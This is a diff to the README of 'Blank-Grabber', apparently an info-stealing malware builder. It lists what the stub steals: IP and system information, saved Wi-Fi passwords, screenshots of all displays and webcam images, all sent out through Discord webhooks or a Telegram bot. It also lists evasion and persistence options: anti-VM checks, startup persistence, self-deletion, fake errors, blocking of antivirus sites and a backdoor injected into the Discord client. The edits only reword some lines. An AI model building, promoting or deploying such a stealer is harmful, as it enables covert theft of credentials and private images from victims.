@@ -60,18 +60,18 @@
     • Grabs IP Information.
     • Grabs System Info.
     • Grabs Saved Wifi Passwords.
-    • Captures Screenshot.
+    • Captures Screenshot Of All The Displays.
     • Captures Webcam Image.
-    • Sends All Data Through Discord Webhooks.
+    • Sends All Data Through Discord Webhooks/Telegram Bot.
     (...more)
 
 ## Stub Settings
 | Option | Description |
 | ------ | ----------- |
 | **Ping Me** | Pings [@everyone](https://www.remote.tools/remote-work/discord-everyone-here#what-is-everyone) when someone runs the stub. |
-| **Anti VM** | Tries its best to prevent running in Virtual Machine. |
+| **Anti VM** | Tries its best to prevent the stub from running on Virtual Machine. |
 | **Put On Startup** | Runs the stub on Windows starup. |
-| **Melt Stub** | Deletes the grabber after use. |
+| **Melt Stub** | Deletes the stub after use. |
 | **Fake Error** | Create custom (fake) error. |
 | **Block AV Sites** | Blocks AV related sites ([Unblock](https://github.com/Blank-c/Blank-Grabber/issues/117)). |
 | **Discord Injection** | Puts backdoor on the Discord client for persistence. |
